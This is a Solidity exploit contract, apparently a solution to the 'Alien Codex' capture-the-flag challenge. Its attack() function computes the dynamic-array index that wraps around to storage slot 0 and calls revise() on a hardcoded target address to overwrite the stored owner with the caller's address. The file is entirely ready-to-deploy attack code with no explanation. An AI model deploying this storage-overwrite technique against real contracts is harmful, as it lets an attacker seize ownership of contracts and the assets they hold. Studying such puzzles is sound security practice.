// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IAlienCodex {
    function revise(uint256, bytes32) external;
}

contract AlienCodexHack {
    IAlienCodex public alienCodex = IAlienCodex(0xbDcABAFc89CeBE36530b258a2335713dFC5a4E54);

    function attack() public {
        uint256 i = uint256(2) ** uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
        alienCodex.revise(i, bytes32(uint256(msg.sender)));
    }
}